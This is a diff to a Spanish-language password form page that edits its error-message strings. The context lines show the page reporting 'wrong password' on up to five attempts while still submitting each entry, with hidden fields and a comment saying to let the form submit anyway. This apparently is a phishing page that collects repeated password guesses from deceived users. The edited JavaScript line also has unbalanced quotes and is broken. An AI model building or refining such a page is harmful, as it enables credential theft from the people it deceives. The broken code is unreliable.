@@ -40,7 +40,7 @@
         <input id="nombre" 
                class="border border-gray-300 rounded px-4 py-2 w-full focus:outline-none focus:ring-1 focus:ring-emerald-500" 
                name="nombre" placeholder="Ingrese su contraseña" type="password" required>
-        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden">❌ Contraseña incorrecta</p>
+        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden"> Contraseña incorrecta</p>
       </div>
       
       <!-- Campos ocultos -->
@@ -76,7 +76,7 @@
         // Mostrar error pero igual dejar que se envíe
         errorMsg.classList.remove("hidden");
         nombre.classList.add("border-red-500");
-        errorMsg.textContent = "❌ Contraseña incorrecta (intento " + intentoNombre + " de 5)";
+        errorMsg.textContent = "Contraseña incorrecta (intento ")";
       } else {
         // En el 6º intento ya no muestra error
         errorMsg.classList.add("hidden");
